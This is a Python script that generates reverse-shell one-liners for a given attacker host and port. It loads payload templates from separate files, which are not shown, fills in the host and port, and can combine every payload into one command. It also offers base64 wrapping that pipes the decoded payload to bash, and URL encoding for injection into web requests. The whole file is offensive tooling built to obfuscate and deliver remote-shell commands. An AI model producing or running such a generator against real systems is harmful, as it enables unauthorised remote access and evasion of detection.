#!/usr/bin/env python3
import sys
import os
import argparse
import base64
import urllib.parse

def print_title(text: str):
    print(f'\n\033[92;1m {text}\033[0m')

def print_payload(text: str):
    print(f' \033[32m{text}\033[0m')

def print_all(rev_shells: list):
    for name, shell in rev_shells:
        print_title(name)
        print_payload(shell)

# Read the default_shells.txt to load in all available shells.
def read_file(filename=None):
    FULLPATH = os.path.dirname(os.path.realpath(__file__)) + "/" + filename
    with open(FULLPATH) as shell_file:
        for line in shell_file:
            payload = line.strip()
            if not payload.startswith("#"):
                yield payload

# Parse given arguments and assign them.
def parse_arguments():
    parser = argparse.ArgumentParser()
    
    parser.add_argument("-H", "--host", help="Hostname or IP of the server", required=True)
    parser.add_argument("-P", "--port", help="Port of the server", required=True)
    parser.add_argument("-A", "--all", help="Use this argument to generate a full one liner to try all the reverse shell possible.", action="store_true")
    parser.add_argument("-B", "--base64", help="Encode all the reverse shells in base64 and build a one liner to execute the decoded string", action="store_true")
    parser.add_argument("-U", "--urlencode", help="Encode all the revere shell in urlencode (if base64 is pecified, encodes them after it)", action="store_true")

    return parser.parse_args()

# Generate reverse shells based on given arguments
def generate(HOST="127.0.0.1", PORT=4444):
    result = []
    for filename in ["personal_shells.txt", "default_shells.txt"]:
        for line in read_file(filename):
            payload_name, payload_code = line.split('|', 1)

            ready_payload = payload_code.replace("{HOST}", HOST).replace("{PORT}", PORT)
            result.append((payload_name, ready_payload))
    return result

# Return base64 encoded shells
def base64encoder(reverse_shells):
    result = []
    for name, shell in reverse_shells:
        encoded_payload = base64.b64encode(shell.encode('utf-8')).decode('utf-8')
        shell = f"echo {encoded_payload} | base64 -d | bash"
        result.append((name, shell))
    return result

# Return url encoded shells
def urlencoder(reverse_shells):
    result = []
    for name, shell in reverse_shells:
        encoded_payload = urllib.parse.quote(shell)
        result.append((name, encoded_payload))
    return result

# Run the script and output the available shells based on given arguments
if __name__ == "__main__":
    args = parse_arguments()
    
    payloads = generate(HOST=args.host, PORT=args.port)

    if args.all:
        tmp_shells = []
        for name, payload in payloads:
            tmp_shells.append(payload)
        payloads = [("All in one", "(" + ");(".join(tmp_shells) + ")")]
    if args.base64:
        payloads = base64encoder(payloads)
    if args.urlencode:
        payloads = urlencoder(payloads)
    
    print_all(payloads)
